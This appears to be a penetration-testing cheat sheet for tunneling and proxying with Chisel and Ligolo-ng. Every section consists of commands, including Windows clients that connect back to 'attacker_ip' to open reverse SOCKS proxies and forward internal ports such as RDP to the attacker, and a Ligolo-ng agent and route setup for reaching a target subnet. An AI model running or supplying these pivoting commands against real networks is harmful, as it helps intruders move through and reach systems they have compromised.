# Tunneling and Proxying

_2 tool commands_

### Chisel  `chisel-tool`
_HTTP tunneling tool_

**Step 0**
> Start the server
_platform: linux_
```
./chisel server -p 8000 --reverse
```

**Step 0**
> Establish a reverse SOCKS proxy
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:socks
```

**Step 0**
> Port forwarding
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

**Step 0**
> Establish a forward SOCKS proxy
_platform: windows_
```
chisel.exe client attacker_ip:8000 socks
```

**Step 0**
> Multiple port forwarding
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:80:127.0.0.1:80 R:3389:127.0.0.1:3389
```

---

### Ligolo-ng  `ligolo-tool`
_Tunneling tool_

**Step 0**
> Start the proxy server
_platform: linux_
```
sudo proxy -selfcert
```

**Step 0**
> Agent connects to the proxy
_platform: windows_
```
agent.exe -connect attacker_ip:11601 -ignore-cert
```

**Step 0**
> Select a session
_platform: linux_
```
session
session_select_id
```

**Step 0**
> Start the tunnel
_platform: linux_
```
start_tunnel
```

**Step 0**
> Add target subnet
_platform: linux_
```
interface_add_route 10.10.10.0/24
```

---
